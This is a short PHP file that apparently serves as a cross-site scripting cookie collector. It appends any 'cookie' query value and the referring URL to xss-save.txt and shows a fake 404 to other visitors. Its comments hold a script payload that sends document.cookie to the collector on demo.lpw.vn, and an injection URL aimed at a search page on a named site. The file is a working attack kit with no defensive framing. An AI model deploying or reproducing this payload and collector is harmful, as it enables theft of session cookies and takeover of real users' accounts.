<?php
function logCurrentURL() {
    if(isset($_GET['cookie']))
    {
        $queryParameters = $_GET['cookie'];
        $currentURL = $_SERVER['HTTP_REFERER'];
        $logFile = 'xss-save.txt';
        $fileHandle = fopen($logFile, 'a');
        fwrite($fileHandle, $currentURL . ': '. $queryParameters . "\n");
        fclose($fileHandle);
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "HTTP/1.0 404 Not Found";
        die();  
    }
    
}
logCurrentURL();
// <script>var cookie = document.cookie; document.location =`https://demo.lpw.vn/xss/?cookie=${cookie}`</script>
// https://jetking.lpw.vn/search.php?keyword=s'><script>var cookie = document.cookie; document.location =`https://demo.lpw.vn/xss/?cookie=${cookie}`</script>
?>